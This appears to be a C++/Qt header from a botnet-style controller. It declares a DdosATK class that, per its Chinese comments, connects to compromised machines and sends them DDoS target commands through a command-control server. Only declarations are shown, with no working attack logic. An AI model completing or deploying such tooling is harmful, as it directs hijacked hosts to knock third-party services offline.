// 与食物新建连接并发送攻击目标信息

#ifndef DDOSATK_H
#define DDOSATK_H

#include <QWidget>
#include <QTextCodec>
#include "tcpserver.h"
#include "tcpsocket.h"

class DdosATK : public QWidget
{
    Q_OBJECT
public:
    explicit DdosATK(QWidget *parent = nullptr);

    // 结束符号
    const QByteArray CmdSplit = ";";
    const QByteArray CmdEnd = "\r\n";

    // 开始Cmd控制服务器，然后返回新的端口号
    int startDdosATKServer();
    // 发送指令
    void sendCommand(QString IP,int PORT);

private:
    TcpServer *mServer;     // 服务端
    TcpSocket *mSock;       // 客户socket

    // 用于解码GBK
    QTextCodec *codec = QTextCodec::codecForName("GBK");
};

#endif // DDOSATK_H
